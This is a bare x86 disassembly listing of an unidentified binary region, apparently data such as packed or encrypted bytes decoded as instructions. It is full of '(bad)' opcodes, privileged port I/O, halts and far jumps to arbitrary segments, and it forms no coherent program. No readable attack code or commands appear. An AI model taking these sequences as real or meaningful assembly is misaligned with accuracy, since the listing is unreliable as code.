  40806a:	jl     0x408029
  40806c:	jmp    0x1603:0x29c3f591
  408073:	popa   
  408074:	jle    0x4080da
  408076:	scas   eax,DWORD PTR es:[edi]
  408077:	popf   
  408078:	out    0x62,al
  40807a:	cmp    BYTE PTR [edi],ah
  40807c:	pop    ss
  40807d:	js     0x408058
  40807f:	push   ebx
  408080:	stc    
  408081:	and    esi,edx
  408083:	jne    0x408056
  408085:	adc    BYTE PTR [eax+0x38bc87ad],dl
  40808b:	daa    
  40808c:	fidivr WORD PTR [edi-0x65c30181]
  408092:	xor    ebp,DWORD PTR [ecx+0x38]
  408095:	xor    eax,0x6b4c8e4
  40809a:	sbb    al,0x18
  40809c:	clc    
  40809d:	xchg   edx,eax
  40809e:	xchg   edi,eax
  40809f:	sub    ch,BYTE PTR [ebp-0x62]
  4080a2:	mov    eax,DWORD PTR [ebp+0x32]
  4080a5:	sub    BYTE PTR [edi-0x25a4e7d1],dl
  4080ab:	(bad)  
  4080ac:	in     eax,0x27
  4080ae:	test   eax,0xbafb97db
  4080b3:	inc    ebx
  4080b4:	aad    0x63
  4080b6:	push   ds
  4080b7:	push   es
  4080b8:	out    dx,al
  4080b9:	pop    ebp
  4080ba:	mov    eax,ds:0xbec72cd6
  4080bf:	in     al,dx
  4080c0:	es fwait
  4080c2:	outs   dx,BYTE PTR ds:[esi]
  4080c3:	sub    al,0xa7
  4080c5:	idiv   ch
  4080c7:	std    
  4080c8:	ret    0x7896
  4080cb:	sub    DWORD PTR [ebp+0x53],0x56
  4080cf:	(bad)
  4080d2:	sar    eax,1
  4080d4:	retf   0x2208
  4080d7:	adc    BYTE PTR [ecx+0x77],ch
  4080da:	sub    al,0xae
  4080dc:	sbb    DWORD PTR [esi+0x1ab5ac77],ecx
  4080e2:	cmp    al,0x77
  4080e4:	ja     0x408112
  4080e6:	adc    bl,BYTE PTR [ebx+edi*2-0x4fd320dc]
  4080ed:	mov    bl,0x71
  4080ef:	cld    
  4080f0:	and    DWORD PTR [edi+0x0],esp
  4080f3:	pop    eax
  4080f4:	adc    al,BYTE PTR [eax+0x2]
  4080f7:	push   ds
  4080f8:	mov    esi,0x171f1718
  4080fd:	inc    DWORD PTR [edi-0x199e0022]
  408103:	mov    BYTE PTR ds:0xbfc7e90b,ch
  408109:	repz and BYTE PTR [ebp-0x25916506],bh
  408110:	push   ebp
  408111:	ja     0x4080a8
  408113:	pop    eax
  408114:	pop    edi
  408115:	int    0xb5
  408117:	mov    edx,0xc690cb1d
  40811c:	out    dx,eax
  40811d:	push   0x4add1ca5
  408122:	lods   al,BYTE PTR ds:[esi]
  408123:	sahf   
  408124:	repz aam 0x60
  408127:	ret    
  408128:	sub    BYTE PTR [esi+ebp*4-0x6c9dfae9],0x4d
  408130:	mov    esp,edi
  408132:	add    al,0x30
  408134:	retf   0xc1f3
  408137:	sub    ah,BYTE PTR [esi+0x4b]
  40813a:	mov    bh,0x43
  40813c:	sub    eax,0xfd663b68
  408141:	jp     0x408162
  408143:	call   0xe79cabc5
  408148:	or     al,0xa5
  40814a:	inc    ebx
  40814b:	pop    ds
  40814c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40814d:	mov    ah,0xf
  40814f:	pop    ds
  408150:	jnp    0x40812b
  408152:	test   al,0x4c
  408154:	mov    ds:0x59001dde,eax
  408159:	ins    DWORD PTR es:[edi],dx
  40815a:	adc    dl,ch
  40815c:	(bad)  
  40815d:	js     0x408152
  40815f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408160:	es loopne 0x4081ba
  408163:	out    dx,al
  408164:	xchg   edx,eax
  408165:	xchg   edi,eax
  408166:	sets   BYTE PTR [edi]
  408169:	jbe    0x408152
  40816b:	(bad)  
  40816c:	sbb    BYTE PTR [edi],ah
  40816e:	imul   ecx,DWORD PTR [ebp+0x3ce12652],0x472d3a27
  408178:	lods   al,BYTE PTR ds:[esi]
  408179:	fcomp  QWORD PTR ds:0xc07f8be8
  40817f:	push   ecx
  408180:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408181:	(bad)  
  408184:	mov    ?,ecx
  408186:	xor    ah,BYTE PTR [ebx-0x5b]
  408189:	aaa    
  40818a:	in     al,0xcb
  40818c:	mov    WORD PTR [edx+0x720db084],ss
  408192:	xor    al,0xd9
  408194:	loopne 0x408129
  408196:	pop    esp
  408197:	sti    
  408198:	int3   
  408199:	add    DWORD PTR [esi],0xbf6a367e
  40819f:	stc    
  4081a0:	aad    0x8d
  4081a2:	loop   0x4081b2
  4081a4:	ins    BYTE PTR es:[edi],dx
  4081a5:	ins    BYTE PTR es:[edi],dx
  4081a6:	iret   
  4081a7:	xor    al,0x10
  4081a9:	sbb    al,0x90
  4081ab:	xchg   edi,eax
  4081ac:	popf   
  4081ad:	add    BYTE PTR [edx],ch
  4081af:	loope  0x4081a0
  4081b1:	mov    bl,0x94
  4081b3:	push   es
  4081b4:	aam    0xec
  4081b6:	cmp    DWORD PTR [esi-0x57],esp
  4081b9:	jmp    0x4081ea
  4081bb:	push   esp
  4081bc:	push   0x2c5ce50
  4081c1:	(bad)  
  4081c2:	pop    ss
  4081c3:	pushf  
  4081c4:	dec    ebx
  4081c5:	push   ecx
  4081c6:	cmp    al,0x57
  4081c8:	clc    
  4081c9:	inc    eax
  4081ca:	enter  0x34c2,0x6
  4081ce:	mov    BYTE PTR [edx+ebp*2-0x2230acf4],0xd6
  4081d6:	inc    ebp
  4081d7:	cmc    
  4081d8:	jmp    0x6e4cf461
  4081dd:	test   eax,0x6cf4cd8f
  4081e2:	leave  
  4081e3:	dec    ebx
  4081e4:	js     0x408211
  4081e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4081e7:	out    0x67,al
  4081e9:	jo     0x4081ca
  4081eb:	(bad)  
  4081ec:	or     eax,0x5803a2d1
  4081f1:	rcl    ebx,0xf9
  4081f4:	and    DWORD PTR [edi-0x7f2d11e6],edx
  4081fa:	jg     0x40825f
  4081fc:	cmp    eax,0x99009d4a
  408201:	xor    eax,0x9477e678
  408206:	xchg   edi,eax
  408207:	mov    al,ds:0xc24b78f2
  40820c:	push   esi
  40820d:	xchg   edi,eax
  40820e:	les    ecx,FWORD PTR [ebp+0x7ca97e50]
  408214:	rol    DWORD PTR [ecx-0x639e4909],0xda
  40821b:	cmp    ebp,DWORD PTR [ebx]
  40821d:	out    0x54,al
  40821f:	dec    esp
  408220:	shl    esp,0xa5
  408223:	mov    al,ds:0xa28bbba8
  408228:	dec    ebp
  408229:	popf   
  40822a:	stos   BYTE PTR es:[edi],al
  40822b:	outs   dx,DWORD PTR ds:[esi]
  40822c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40822d:	inc    ebx
  40822e:	cli    
  40822f:	nop
  408230:	push   eax
  408231:	out    0x20,eax
  408233:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408234:	pop    esp
  408235:	outs   dx,BYTE PTR ds:[esi]
  408236:	into   
  408237:	sbb    bl,BYTE PTR [esi]
  408239:	hlt    
  40823a:	adc    bh,cl
  40823c:	(bad)  
  40823d:	(bad)  
  40823f:	out    0xce,al
  408241:	xor    eax,DWORD PTR [esi+edi*1+0x168b1fe8]
  408248:	mov    esp,0xc3e09dd9
  40824d:	aas    
  40824e:	enter  0xfb14,0x5a
  408252:	fisubr WORD PTR [edi+0x37]
  408255:	push   ecx
  408256:	inc    ecx
  408257:	add    al,0xc1
  408259:	lock adc eax,0x4181df76
  40825f:	inc    BYTE PTR [ebx]
  408261:	jns    0x40828a
  408263:	adc    eax,0xdbcd4b76
  408268:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408269:	cs cmp eax,0x6590d441
  40826f:	sbb    dh,BYTE PTR [ebx+edx*2+0x1e]
  408273:	cmp    ecx,0xfffffff6
  408276:	or     ecx,DWORD PTR [edx+ebx*2]
  408279:	mov    edx,0x7d0d7354
  40827e:	adc    DWORD PTR [ebp-0x3f],esi
  408281:	dec    ebx
  408282:	or     DWORD PTR [edi+ecx*8-0x70aedff6],ecx
  408289:	and    al,0x6d
  40828b:	add    DWORD PTR [ebx+0x20919905],eax
  408291:	cwde   
  408292:	sar    BYTE PTR [ecx-0x8259093],0x3a
  408299:	adc    al,0x2
  40829b:	sbb    al,0x92
  40829d:	out    0x4c,al
  40829f:	add    edx,DWORD PTR [ebx+edi*2]
  4082a2:	pop    ds
  4082a3:	jns    0x40828d
  4082a5:	or     BYTE PTR [edx-0x71],0x68
  4082a9:	bound  esp,QWORD PTR gs:[edi]
  4082ac:	xor    ebx,DWORD PTR [ebp-0x65b42489]
  4082b2:	pop    es
  4082b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4082b4:	in     al,dx
  4082b5:	(bad)  
  4082b7:	sbb    DWORD PTR [ebx-0x57],eax
  4082ba:	gs sub edi,ebp
  4082bd:	scas   al,BYTE PTR es:[edi]
  4082be:	jle    0x408339
  4082c0:	push   ebx
  4082c1:	jae    0x408266
  4082c3:	sbb    al,0xcf
  4082c5:	scas   al,BYTE PTR es:[edi]
  4082c6:	(bad)  
  4082c7:	aam    0x63
  4082c9:	mov    ch,0xa
  4082cb:	bound  esp,QWORD PTR [esi]
  4082cd:	xchg   edi,eax
  4082ce:	jg     0x4082a9
  4082d0:	scas   eax,DWORD PTR es:[edi]
  4082d1:	xor    dh,dl
  4082d3:	pop    ds
  4082d4:	(bad)  
  4082d5:	dec    edx
  4082d6:	xchg   edi,eax
  4082d7:	and    eax,DWORD PTR [ebp+0x3d76222c]
  4082dd:	dec    ebp
  4082de:	in     eax,dx
  4082df:	fwait
  4082e0:	stc    
  4082e1:	inc    ebp
  4082e2:	outs   dx,BYTE PTR ds:[esi]
  4082e3:	mov    eax,0xb0894360
  4082e8:	pop    ebx
  4082e9:	(bad)  
  4082ea:	pop    edi
  4082eb:	sub    DWORD PTR ds:0x4fd4db71,ebx
  4082f1:	sbb    ebp,edx
  4082f3:	or     al,0xe
  4082f5:	cmp    eax,0xa197a119
  4082fa:	lahf   
  4082fb:	and    cl,ah
  4082fd:	add    DWORD PTR [edx],0x78067bbf
  408303:	outs   dx,DWORD PTR ds:[esi]
  408304:	cmp    DWORD PTR [ebx+0x26],eax
  408307:	mov    dh,0xf8
  408309:	cmp    DWORD PTR [ebx+edi*2+0x51577823],ebp
  408310:	loop   0x4082d2
  408312:	jbe    0x40836c
  408314:	pusha  
  408315:	nop
  408316:	mov    ah,dh
  408318:	mov    es,WORD PTR [edi+esi*1+0x17b3c839]
  40831f:	push   edx
  408320:	inc    ecx
  408321:	adc    DWORD PTR [eax+0x132d2d43],edi
  408327:	xchg   ebp,eax
  408328:	jge    0x4082ff
  40832a:	pop    es
  40832b:	xor    DWORD PTR [edi-0xff9ab1],0xe47589b2
  408335:	cli    
  408336:	sub    al,0xca
  408338:	mov    ebx,0x6a43e5e2
  40833d:	mov    esi,0xe3f7889
  408342:	imul   edi,DWORD PTR [edi-0x55],0xa74074d9
  408349:	ins    BYTE PTR es:[edi],dx
  40834a:	scas   al,BYTE PTR es:[edi]
  40834b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40834c:	jecxz  0x408323
  40834e:	jne    0x4082eb
  408350:	mov    bl,0xa1
  408352:	xchg   ebp,eax
  408353:	pop    esi
  408354:	scas   eax,DWORD PTR es:[edi]
  408355:	dec    esp
  408356:	loope  0x4083d2
  408358:	(bad)  
  408359:	mov    dl,0x56
  40835b:	sbb    bl,cl
  40835d:	sub    DWORD PTR [ecx+0x1f],0x5e964e5
  408364:	(bad)  
  408366:	js     0x4083ab
  408368:	push   ecx
  408369:	pop    esi
  40836a:	pop    edi
  40836b:	sub    ecx,edx
  40836d:	xchg   BYTE PTR [eax+0xc],dh
  408370:	ror    DWORD PTR [ebp-0x1f],cl
  408373:	mov    bh,0x9
  408375:	rcl    DWORD PTR [ebx-0x8b96001],0xf9
  40837c:	cmc    
  40837d:	adc    eax,0xd4e3eb02
  408382:	mov    ebp,0x9ef65322
  408387:	pop    eax
  408388:	mov    esi,0x25552ae9
  40838d:	mov    eax,0x74ff71db
  408392:	mov    ch,bl
  408394:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408395:	fld    QWORD PTR [edx-0x77]
  408398:	mov    ebp,0xbcbc6709
  40839d:	rcl    DWORD PTR [edi+edx*2],cl
  4083a0:	retf   
  4083a1:	push   eax
  4083a2:	fcmove st,st(3)
  4083a4:	sub    eax,0x2248268a
  4083a9:	push   esp
  4083aa:	fwait
  4083ab:	nop
  4083ac:	je     0x408364
  4083ae:	jae    0x4083c7
  4083b0:	outs   dx,DWORD PTR ds:[esi]
  4083b1:	repnz sti 
  4083b3:	push   ebx
  4083b4:	mov    al,0x8f
  4083b6:	mov    ds:0x32300209,al
  4083bb:	out    0x66,al
  4083bd:	and    eax,0x63b254f9
  4083c2:	pusha  
  4083c3:	in     al,0x42
  4083c5:	sbb    al,0x7e
  4083c7:	shl    BYTE PTR [eax+0x23],1
  4083ca:	loopne 0x4083a6
  4083cc:	xchg   edx,eax
  4083cd:	rcr    BYTE PTR [edx-0x1f278057],0x79
  4083d4:	rcr    DWORD PTR [ebx-0x70],0xa0
  4083d8:	mov    edx,0x30a91a3
  4083dd:	enter  0x5ec7,0xfb
  4083e1:	test   al,0x5a
  4083e3:	lock ror BYTE PTR [ebp+0x51],1
  4083e7:	ss (bad) 
  4083ea:	and    DWORD PTR [edi+ebp*1-0x71],esp
  4083ee:	mov    al,0x8a
  4083f0:	pop    ebx
  4083f1:	popa   
  4083f2:	push   edi
  4083f3:	nop
  4083f4:	add    al,0xdb
  4083f6:	xchg   edx,eax
  4083f7:	or     DWORD PTR [eax-0x7e],edi
  4083fa:	out    dx,al
  4083fb:	inc    edi
  4083fc:	lods   al,BYTE PTR ds:[esi]
  4083fd:	call   0xf48edec5
  408402:	jno    0x408433
  408404:	mov    ds:0xbb795822,al
  408409:	jns    0x40844f
  40840b:	push   ds
  40840c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40840d:	dec    ebx
  40840e:	sub    edi,DWORD PTR [esi-0xdc55024]
  408414:	jecxz  0x40840f
  408416:	fisub  WORD PTR [edx]
  408418:	push   ss
  408419:	fcomp  QWORD PTR [eax+ebp*1+0x78f7ee6e]
  408420:	or     BYTE PTR [esi+0x6745e522],ch
  408426:	dec    esp
  408427:	std    
  408428:	je     0x4083f1
  40842a:	inc    ebx
  40842b:	mul    BYTE PTR [edx]
  40842d:	test   esp,0x3d6645b5
  408433:	fistp  QWORD PTR [edx]
  408435:	scas   al,BYTE PTR es:[edi]
  408436:	xchg   ecx,eax
  408437:	adc    al,0x88
  408439:	mov    ebx,0xa4f725f5
  40843e:	call   0x8246:0x60ce966c
  408445:	popa   
  408446:	cmp    edx,edx
  408448:	mov    dl,0xe2
  40844a:	fistp  WORD PTR [edx-0x3159c884]
  408450:	repnz arpl WORD PTR [edx+0x160eb6d3],si
  408457:	mov    al,0x6e
  408459:	jnp    0x4084a0
  40845b:	in     al,0xee
  40845d:	mov    ch,0x74
  40845f:	clc    
  408460:	scas   al,BYTE PTR es:[edi]
  408461:	cld    
  408462:	push   0x5642d49a
  408467:	dec    edi
  408468:	dec    esp
  408469:	lea    esp,[esp+ebx*1+0x6d2b96c4]
  408470:	icebp  
  408471:	sar    DWORD PTR [edi],1
  408473:	rcl    BYTE PTR [ecx+ebx*8+0x1e],0x42
  408478:	nop
  408479:	dec    esi
  40847a:	bound  ecx,QWORD PTR [ecx]
  40847c:	pop    es
  40847d:	push   edi
  40847e:	shr    DWORD PTR [eax-0x21e8582],cl
  408484:	mov    al,ds:0xa06de44d
  408489:	add    dh,al
  40848b:	xor    cl,BYTE PTR [edx-0x38]
  40848e:	rcl    BYTE PTR [esi+esi*8+0x1c],0x91
  408493:	mov    al,ds:0xdc68838c
  408498:	push   es
  408499:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40849a:	ror    BYTE PTR [esi-0x7fbb113c],cl
  4084a0:	xor    ebp,ebp
  4084a2:	cmp    esp,DWORD PTR [ecx-0x62175efa]
  4084a8:	test   BYTE PTR [edi-0x61702849],bl
  4084ae:	popa   
  4084af:	add    eax,0x1a7025f5
  4084b4:	mov    edi,0x4293871
  4084b9:	mov    dl,0x79
  4084bb:	sub    eax,DWORD PTR ds:0x11cb9e9
  4084c1:	pushf  
  4084c2:	clc    
  4084c3:	aam    0x4c
  4084c5:	sbb    al,0xd2
  4084c7:	in     al,0xa6
  4084c9:	retf   0xf74
  4084cc:	jb     0x408505
  4084ce:	xor    BYTE PTR [edx+0x75291fa4],dh
  4084d4:	sbb    BYTE PTR [edx+0x48abd05],bl
  4084da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4084db:	test   al,0xa2
  4084dd:	call   0xbd05:0x8e2a8d12
  4084e4:	loope  0x408549
  4084e6:	adc    al,0x75
  4084e8:	out    dx,eax
  4084e9:	xchg   BYTE PTR [ecx+0x2e430c63],dh
  4084ef:	mov    edx,0x81ff8186
  4084f4:	pop    ss
  4084f5:	jns    0x40856d
  4084f7:	jle    0x408520
  4084f9:	mov    esi,0xda7e3a11
  4084fe:	sbb    BYTE PTR [esi-0x75],al
  408501:	xchg   esp,eax
  408502:	cmp    DWORD PTR [eax-0x22],0x28
  408506:	scas   eax,DWORD PTR es:[edi]
  408507:	jns    0x4084d4
  408509:	xlat   BYTE PTR ds:[ebx]
  40850a:	pop    ebx
  40850c:	and    ebp,DWORD PTR [edx+0x45acacd1]
  408512:	enter  0xf4fa,0xba
  408516:	jle    0x40856a
  408518:	scas   eax,DWORD PTR es:[edi]
  408519:	push   0x5d9260ab
  40851e:	push   ecx
  40851f:	hlt    
  408520:	popf   
  408521:	push   ds
  408522:	stos   DWORD PTR es:[edi],eax
  408523:	(bad)  
  408524:	(bad)  
  408525:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408526:	jo     0x408527
  408528:	imul   eax,DWORD PTR [ecx-0x3e739e1b],0xf74d4979
  408532:	ja     0x408512
  408534:	add    eax,0xb46fe221
  408539:	xor    edx,ebp
  40853b:	sbb    DWORD PTR [edi+edi*1-0x51],esi
  40853f:	cld    
  408540:	daa    
  408541:	xor    al,0xb3
  408543:	jo     0x408519
  408545:	in     al,0xf1
  408547:	leave  
  408548:	cmp    BYTE PTR [eax-0x5e],bl
  40854b:	xchg   ebx,eax
  40854c:	gs inc edi
  40854e:	or     BYTE PTR [eax+0x41043a3e],ch
  408554:	and    DWORD PTR [edi],esi
  408556:	mov    dl,0x29
  408558:	xchg   esp,eax
  408559:	mov    ds:0x7fd7d9f5,eax
  40855e:	inc    edx
  40855f:	sub    edx,ebp
  408561:	dec    esi
  408562:	add    al,BYTE PTR [ebx-0x38]
  408565:	out    0xa4,eax
  408567:	addps  xmm0,xmm6
  40856a:	adc    ecx,0x6a
  40856d:	jne    0x408550
  40856f:	xor    al,0x3b
  408571:	and    al,0x33
  408573:	ret    0xc0c8
  408576:	es sti 
  408578:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408579:	les    edx,FWORD PTR [esi+0x52370719]
  40857f:	sbb    bl,bh
  408581:	jo     0x408557
  408583:	mov    bl,0xa3
  408585:	push   esi
  408586:	out    0xf7,eax
  408588:	popa   
  408589:	push   esi
  40858a:	sub    edi,ecx
  40858c:	sbb    eax,DWORD PTR [edx]
  40858e:	push   esp
  40858f:	xchg   ebx,eax
  408590:	jo     0x408550
  408592:	lea    esi,[edx+0x6c]
  408595:	sti    
  408596:	mov    edi,0x6e567844
  40859b:	xor    BYTE PTR [eax],0x48
  40859e:	mov    ds:0xeedf537c,eax
  4085a3:	mov    bh,0x28
  4085a5:	adc    ecx,0x671bf5e2
  4085ab:	sub    BYTE PTR [ebx+0x25],bh
  4085ae:	xchg   edx,esp
  4085b0:	sbb    eax,0xbbbd5c1e
  4085b5:	imul   ebx,DWORD PTR [edx+ebp*4],0xc3c79a7e
  4085bc:	pop    ecx
  4085bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4085be:	adc    eax,0x80dfed47
  4085c3:	xchg   esi,eax
  4085c4:	cmp    al,BYTE PTR [ecx-0x7a]
  4085c7:	cmp    ebp,DWORD PTR [ebp-0x4b]
  4085ca:	sbb    ecx,esp
  4085cc:	cwde   
  4085cd:	pop    eax
  4085ce:	mov    cl,0x25
  4085d0:	xchg   esp,eax
  4085d1:	adc    eax,0x123a688f
  4085d6:	lods   al,BYTE PTR ds:[esi]
  4085d7:	xor    cl,BYTE PTR [esi]
  4085d9:	ret    
  4085da:	dec    eax
  4085db:	in     al,dx
  4085dc:	out    0xe0,al
  4085de:	or     al,0x7b
  4085e0:	sbb    DWORD PTR [ebp-0x31],ecx
  4085e3:	xor    esp,ebx
  4085e5:	mov    ds:0xff83616f,eax
  4085ea:	(bad)  
  4085eb:	cmc    
  4085ec:	arpl   WORD PTR [ebp-0x3410d8fa],si
  4085f2:	lods   eax,DWORD PTR ds:[esi]
  4085f3:	daa    
  4085f4:	stos   BYTE PTR es:[edi],al
  4085f5:	mov    bh,BYTE PTR [edx+0x5b7bcf40]
  4085fb:	xchg   ecx,eax
  4085fc:	dec    edi
  4085fd:	hlt    
  4085fe:	cwde   
  4085ff:	in     eax,0x39
  408601:	mov    bh,0xb9
  408603:	sbb    DWORD PTR [edi],0x9c86c9f9
  408609:	sub    dh,BYTE PTR [ecx+ebp*4]
  40860c:	aam    0xfa
  40860e:	mov    esi,0x2c6f2986
  408613:	add    al,0xe4
  408615:	mov    esp,ebx
  408617:	mov    ebp,0xd1734ad7
  40861c:	sub    DWORD PTR [ebx-0x71],eax
  40861f:	add    DWORD PTR [ebx-0x315b199d],ebp
  408625:	mov    al,0xa2
  408627:	cmp    DWORD PTR [ebp+0x1e],edi
  40862a:	dec    esi
  40862b:	xor    DWORD PTR [esi],eax
  40862d:	fwait
  40862e:	xchg   ebp,eax
  40862f:	test   BYTE PTR [edx-0x4792c455],bl
  408635:	dec    ebp
  408636:	dec    esp
  408637:	and    edx,DWORD PTR [ebp-0x42]
  40863a:	push   edx
  40863b:	add    al,0x6f
  40863d:	nop
  40863e:	xor    DWORD PTR [eax-0x4b987c40],ebp
  408644:	retf   0x308f
  408647:	jo     0x40861e
  408649:	rol    BYTE PTR [eax-0x7f75eaf8],0x61
  408650:	pop    edi
  408651:	int3   
  408652:	test   al,0xaf
  408654:	cs daa 
  408656:	mov    ds:0x6d7215e,eax
  40865b:	xor    esi,DWORD PTR [edi+0x7a]
  40865e:	jmp    0x79fc:0x47a31f0c
  408665:	popa   
  408666:	lea    eax,[eax]
  408668:	sahf   
  408669:	add    BYTE PTR [ecx-0x134c2ee9],0xc9
  408670:	push   ds
  408671:	xchg   edx,eax
  408672:	cli    
  408673:	push   0xffffffd1
  408675:	outs   dx,BYTE PTR ds:[esi]
  408676:	xchg   DWORD PTR [eax],esi
  408678:	xor    ebx,edi
  40867a:	and    DWORD PTR [ebp-0x11eb32fd],ecx
  408680:	sbb    dh,BYTE PTR [ebp+ebp*1-0x3df9497d]
  408687:	mov    bh,dl
  408689:	push   ss
  40868a:	or     dh,bh
  40868c:	mov    dh,0xa5
  40868e:	and    eax,DWORD PTR fs:[ebp+0x67]
  408692:	jge    0x4086a0
  408694:	mov    bl,0x46
  408696:	loope  0x40863a
  408698:	push   esp
  408699:	dec    eax
  40869a:	cmp    eax,0x33e339b3
  40869f:	mov    dh,0xfa
  4086a1:	lods   al,BYTE PTR ds:[esi]
  4086a2:	inc    edx
  4086a3:	fcom   QWORD PTR [edx-0x20]
  4086a6:	pushf  
  4086a7:	sub    BYTE PTR [esi+ecx*4-0x4c],bl
  4086ab:	xor    ebp,DWORD PTR [ebx]
  4086ad:	sub    DWORD PTR [ebx-0x3575a46d],eax
  4086b3:	ret    0x5de9
  4086b6:	idiv   BYTE PTR [edi]
  4086b8:	stc    
  4086b9:	test   eax,0x3dc1ce29
  4086be:	out    0xb9,eax
  4086c0:	cmp    ebp,DWORD PTR [edx+eiz*1+0x16]
  4086c4:	add    al,0x5c
  4086c6:	push   edi
  4086c7:	sar    BYTE PTR [ecx-0x11],cl
  4086ca:	xchg   ebp,eax
  4086cb:	xchg   edi,ebp
  4086cd:	pop    edx
  4086ce:	rcr    BYTE PTR [esi],0x9b
  4086d1:	fldcw  WORD PTR [ebp+0x19b607b4]
  4086d7:	aas    
  4086d8:	scas   al,BYTE PTR es:[edi]
  4086d9:	and    bh,bh
  4086db:	dec    edi
  4086dc:	mov    bh,0x6b
  4086de:	(bad)
  4086e1:	inc    ebx
  4086e2:	add    DWORD PTR [ebx-0x27],ebp
  4086e5:	pop    esp
  4086e6:	inc    ecx
  4086e7:	in     eax,dx
  4086e8:	xor    edx,DWORD PTR [ecx-0x28]
  4086eb:	cmc    
  4086ec:	cmp    ah,bh
  4086ee:	mov    ebx,0xe383d9aa
  4086f3:	jl     0x4086da
  4086f5:	add    eax,eax
  4086f7:	fwait
  4086f8:	push   edi
  4086f9:	dec    edx
  4086fa:	jmp    0x40871a
  4086fc:	mov    eax,ds:0x40d1a3ee
  408701:	jp     0x408683
  408703:	sub    esp,DWORD PTR [edi]
  408705:	fnstenv [edx+0x22]
  408708:	xchg   esi,eax
  408709:	inc    edi
  40870a:	adc    ebx,DWORD PTR [ebx+0x71]
  40870d:	and    DWORD PTR cs:[ebx-0x77f16cb1],0x76d4a81e
  408718:	fistp  QWORD PTR [ebp+0x79]
  40871b:	iret   
  40871c:	test   BYTE PTR [ebx],0x78
  40871f:	icebp  
  408720:	or     BYTE PTR [edi],0x90
  408723:	mov    ah,0xe6
  408725:	stc    
  408726:	or     ebx,0xfeedcef3
  40872c:	jge    0x408754
  40872e:	mov    edx,cs
  408730:	jp     0x408734
  408732:	nop
  408733:	or     BYTE PTR [edi+ecx*4+0x3e801e50],cl
  40873a:	add    ebp,DWORD PTR [edx+0x7d]
  40873d:	push   edx
  40873e:	(bad)  
  40873f:	dec    ebp
  408740:	sahf   
  408741:	leave  
  408742:	add    al,0xa8
  408744:	rcl    BYTE PTR [ebx-0x77c19538],cl
  40874a:	pop    ebp
  40874b:	push   ebx
  40874c:	sub    BYTE PTR ds:0xd9018ba1,dh
  408752:	aaa    
  408753:	es dec eax
  408755:	mov    al,ds:0xb78d6057
  40875a:	stos   BYTE PTR es:[edi],al
  40875b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40875c:	push   esp
  40875d:	mov    al,ds:0x67fd0f18
  408762:	std    
  408763:	push   edi
  408764:	push   cs
  408765:	in     eax,0xf
  408767:	jecxz  0x4087ae
  408769:	sbb    al,0x55
  40876b:	iret   
  40876c:	jmp    0x4087c4
  40876e:	pop    ebx
  40876f:	add    al,0x33
  408771:	push   ss
  408772:	mov    ah,0x49
  408774:	and    DWORD PTR [ebp+0x354dd1f9],ebp
  40877a:	out    0x39,al
  40877c:	xlat   BYTE PTR ds:[bx]
  40877e:	and    BYTE PTR [ecx],cl
  408780:	ror    DWORD PTR [ecx],0x86
  408783:	push   esi
  408784:	or     ebx,DWORD PTR [ebx]
  408786:	push   eax
  408787:	and    BYTE PTR [edi-0x2f],dh
  40878a:	cmp    DWORD PTR [esi],ebx
  40878c:	mov    esi,0xf1e0beee
  408791:	call   DWORD PTR [ebp-0x30]
  408794:	clc    
  408795:	fisubr DWORD PTR [edi+0x67]
  408798:	loopne 0x4087c5
  40879a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40879b:	pop    esi
  40879c:	or     eax,0xf7b1262d
  4087a1:	push   edi
  4087a2:	imul   esi,esp,0x6a998c22
  4087a8:	fsubr  st,st(6)
  4087aa:	out    dx,eax
  4087ab:	mov    edi,0x74c83364
  4087b0:	inc    edx
  4087b2:	sub    dl,BYTE PTR [eax+0x211ec4f5]
  4087b8:	cmp    esp,ebp
  4087ba:	xchg   esi,eax
  4087bb:	jns    0x4087d3
  4087bd:	push   eax
  4087be:	adc    edi,DWORD PTR [ecx]
  4087c0:	outs   dx,BYTE PTR ds:[esi]
  4087c1:	cmc    
  4087c2:	js     0x4087e2
  4087c4:	fwait
  4087c5:	fwait
  4087c6:	enter  0xcb35,0xce
  4087ca:	outs   dx,DWORD PTR ds:[esi]
  4087cb:	push   edx
  4087cc:	push   esp
  4087cd:	into   
  4087ce:	pop    ebp
  4087cf:	pop    ecx
  4087d0:	jecxz  0x4087f2
  4087d2:	mov    esp,0x6d4baa76
  4087d7:	jo     0x408835
  4087d9:	sbb    eax,0x6c616128
  4087de:	jne    0x4087d0
  4087e0:	fwait
  4087e1:	cmp    DWORD PTR [ebx+0x7bc94a28],esp
  4087e7:	mov    ebp,0x601596aa
  4087ec:	aad    0xe5
  4087ee:	mov    eax,0xc0c667de
  4087f3:	test   eax,0xe3f34168
  4087f8:	xlat   BYTE PTR ds:[ebx]
  4087f9:	fld    DWORD PTR [eax*4+0x374572e5]
  408800:	popf   
  408801:	sar    BYTE PTR [edi+eax*2+0x6],0x76
  408806:	pusha  
  408807:	inc    ebx
  408808:	aam    0xd0
  40880a:	sar    DWORD PTR [ebx+ebp*2],1
  40880d:	jne    0x408848
  40880f:	cmp    DWORD PTR [ebx+0x781cf340],esi
  408815:	std    
  408816:	xchg   ebp,eax
  408817:	pop    ebx
  408818:	jge    0x4087c6
  40881a:	shr    esi,cl
  40881c:	icebp  
  40881d:	ja     0x4087bd
  40881f:	imul   esi,ebx,0xfffffffa
  408822:	stos   BYTE PTR es:[edi],al
  408823:	jge    0x408829
  408825:	fsubr  st,st(4)
  408827:	push   ebp
  408828:	xchg   ebx,eax
  408829:	sub    eax,0x230ded35
  40882e:	aas    
  40882f:	(bad)  
  408830:	fwait
